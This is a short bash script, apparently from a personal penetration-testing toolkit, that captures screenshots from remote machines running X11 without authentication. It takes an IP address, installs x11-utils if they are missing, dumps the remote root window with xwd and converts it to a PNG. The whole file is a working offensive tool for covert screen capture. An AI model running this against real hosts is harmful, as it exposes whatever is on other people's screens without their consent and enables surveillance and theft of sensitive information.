#!/bin/bash
# Rafa quick scripts: Take screenshots of machines running X11 with no auth. 

if [ "$#" -ne 1 ]; then
	echo "Take screenshots of machines running X11 with no auth."
	echo "Usage: $0 <ip-address-of-x11-service>"
	exit 1
fi

if ! [ -x "$(command -v xwd)" ]; then
	echo "The X11 utilities are not installed on your box. Installing."
	apt-get -y -qq install x11-utils
fi

xwd -root -screen -silent -display $1:0 > $1.xwd
convert $1.xwd $1.png
rm $1.xwd

exit 0
